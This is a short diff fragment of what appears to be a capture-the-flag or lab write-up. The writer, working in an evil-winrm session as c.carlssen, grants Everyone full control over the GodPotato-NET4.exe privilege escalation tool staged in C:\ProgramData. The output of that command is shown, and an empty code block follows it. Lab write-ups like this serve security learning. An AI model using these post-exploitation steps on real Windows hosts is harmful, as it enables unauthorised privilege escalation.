@@ -938,4 +938,15 @@ evil-winrm-py PS C:\ProgramData>
 
 Ill use my winrm session as `c.carlssen` to upload it to the target
 
+```python
+evil-winrm-py PS C:\ProgramData> icacls ".\GodPotato-NET4.exe" /grant Everyone:F
+processed file: .\GodPotato-NET4.exe
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\ProgramData>
+```
 
+Ill then grant all users full control over this file
+
+```python
+
+```
